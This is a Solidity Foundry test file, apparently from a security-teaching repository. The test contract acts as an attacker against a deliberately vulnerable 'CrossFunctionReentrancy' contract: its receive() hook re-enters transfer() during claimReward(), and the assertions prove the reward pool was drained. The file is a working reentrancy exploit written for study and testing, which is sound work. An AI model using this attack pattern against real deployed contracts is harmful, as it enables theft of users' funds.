// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {CrossFunctionReentrancy} from "../../src/reentrancy/2_CrossFunction.sol";

contract CrossFunctionReentrancyTest is Test {
    CrossFunctionReentrancy public vulnerable;
    address public victim = address(0x2);
    uint256 public reentrancyCount;
    bool public isAttacking;

    function setUp() public {
        vulnerable = new CrossFunctionReentrancy();
        vm.deal(victim, 20 ether); // Fund victim generously
        vm.deal(address(this), 1 ether); // Just enough for attacker deposit
    }

    receive() external payable {
        if (isAttacking && reentrancyCount < 2) {
            reentrancyCount++;
            vulnerable.transfer(address(this), 1 wei);
        }
    }

    function testCrossFunctionReentrancy() public {
        // Setup victim deposits and rewards
        vm.startPrank(victim);
        vulnerable.deposit{value: 5 ether}();
        vulnerable.addReward{value: 3 ether}();
        vm.stopPrank();
        
        // Attacker deposits
        vulnerable.deposit{value: 1 ether}();

        uint256 initialAttackerBalance = address(this).balance;
        uint256 initialRewardBalance = vulnerable.rewardBalance();

        // Start attack
        isAttacking = true;
        vulnerable.claimReward();
        isAttacking = false;

        // Assertions to prove vulnerability exists
        assertGt(address(this).balance, initialAttackerBalance, "Attacker gained extra ETH");
        assertLt(vulnerable.rewardBalance(), initialRewardBalance, "Reward pool was drained");
        assertGt(reentrancyCount, 0, "Reentrancy occurred");
    }
}